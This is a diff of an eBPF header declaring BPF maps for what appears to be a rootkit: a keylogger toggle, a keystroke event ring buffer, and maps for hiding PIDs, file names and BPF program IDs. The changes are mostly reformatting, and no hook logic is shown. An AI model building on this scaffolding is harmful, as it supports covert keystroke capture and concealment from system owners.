@@ -3,16 +3,16 @@
 
 #include "config.h"
 #include <bpf/bpf_helpers.h>
+#include <bpf/bpf_core_read.h>
 #include <vmlinux.h>
 
-#define CONFIG_MAP_MAX_ENTRIES 10
-#define EVENTS_MAP_MAX_ENTRIES 256 * 1024
+#define CONFIG_MAP_MAX_ENTRIES        10
+#define EVENTS_MAP_MAX_ENTRIES        256 * 1024
 #define KEYLOG_EVENTS_MAP_MAX_ENTRIES 128 * 1024
-#define HIDE_NAMES_MAP_MAX_ENTRIES 256
-#define HIDE_PORTS_MAP_MAX_ENTRIES 64
+#define HIDE_NAMES_MAP_MAX_ENTRIES    256
 
 enum config_keys {
-  KEYLOGGER_ENABLED = 0,
+    KEYLOGGER_ENABLED = 0,
 };
 
 /**
@@ -20,10 +20,10 @@ enum config_keys {
  *
  */
 struct {
-  __uint(type, BPF_MAP_TYPE_ARRAY);
-  __uint(max_entries, CONFIG_MAP_MAX_ENTRIES);
-  __type(key, u32);
-  __type(value, u32);
+    __uint(type, BPF_MAP_TYPE_ARRAY);
+    __uint(max_entries, CONFIG_MAP_MAX_ENTRIES);
+    __type(key, u32);
+    __type(value, u32);
 } config_map SEC(".maps");
 
 /**
@@ -33,8 +33,8 @@ struct {
  * Value: u32 Value
  */
 struct {
-  __uint(type, BPF_MAP_TYPE_RINGBUF);
-  __uint(max_entries, EVENTS_MAP_MAX_ENTRIES);
+    __uint(type, BPF_MAP_TYPE_RINGBUF);
+    __uint(max_entries, EVENTS_MAP_MAX_ENTRIES);
 } events SEC(".maps");
 
 /**
@@ -42,8 +42,8 @@ struct {
  *
  */
 struct {
-  __uint(type, BPF_MAP_TYPE_RINGBUF);
-  __uint(max_entries, KEYLOG_EVENTS_MAP_MAX_ENTRIES); /* 128 KB buffer */
+    __uint(type, BPF_MAP_TYPE_RINGBUF);
+    __uint(max_entries, KEYLOG_EVENTS_MAP_MAX_ENTRIES); /* 128 KB buffer */
 } keylog_events SEC(".maps");
 
 /**
@@ -56,10 +56,10 @@ struct {
  *
  */
 struct {
-  __uint(type, BPF_MAP_TYPE_HASH);
-  __uint(max_entries, HIDE_NAMES_MAP_MAX_ENTRIES);
-  __type(key, pid_t);
-  __type(value, u8);
+    __uint(type, BPF_MAP_TYPE_HASH);
+    __uint(max_entries, HIDE_NAMES_MAP_MAX_ENTRIES);
+    __type(key, pid_t);
+    __type(value, u8);
 } tracked_pids_map SEC(".maps");
 
 /**
@@ -70,10 +70,10 @@ struct {
  *
  */
 struct {
-  __uint(type, BPF_MAP_TYPE_HASH);
-  __uint(max_entries, HIDE_NAMES_MAP_MAX_ENTRIES);
-  __type(key, char[MAX_HIDDEN_FILE_NAME_LEN]);
-  __type(value, u8);
+    __uint(type, BPF_MAP_TYPE_HASH);
+    __uint(max_entries, HIDE_NAMES_MAP_MAX_ENTRIES);
+    __type(key, char[MAX_HIDDEN_FILE_NAME_LEN]);
+    __type(value, u8);
 } hide_names_map SEC(".maps");
 
 /**
@@ -84,10 +84,10 @@ struct {
  *
  */
 struct {
-  __uint(type, BPF_MAP_TYPE_HASH);
-  __uint(max_entries, 64);
-  __type(key, u32);
-  __type(value, u8);
+    __uint(type, BPF_MAP_TYPE_HASH);
+    __uint(max_entries, 64);
+    __type(key, u32);
+    __type(value, u8);
 } hide_bpf_ids_map SEC(".maps");
 
 #endif /* __MAPS_H */
